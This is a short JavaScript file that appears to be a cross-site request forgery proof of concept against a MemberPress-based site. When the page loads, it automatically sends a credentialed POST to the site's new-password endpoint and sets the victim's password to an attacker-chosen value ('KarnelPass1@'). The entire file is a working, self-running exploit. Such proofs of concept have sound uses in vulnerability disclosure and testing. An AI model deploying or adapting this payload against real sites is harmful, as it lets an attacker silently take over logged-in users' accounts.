function submitRequest() {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://itpm.com:443/itpm-account/?action=newpassword", true);
    xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.withCredentials = true;

    var body = "plugin=mepr&action=updatepassword&mepr-new-password=KarnelPass1%40&mepr-confirm-password=KarnelPass1%40";
    var aBody = new Uint8Array(body.length);

    for (var i = 0; i < aBody.length; i++) {
        aBody[i] = body.charCodeAt(i);
    }

    xhr.send(new Blob([aBody]));
}

submitRequest();
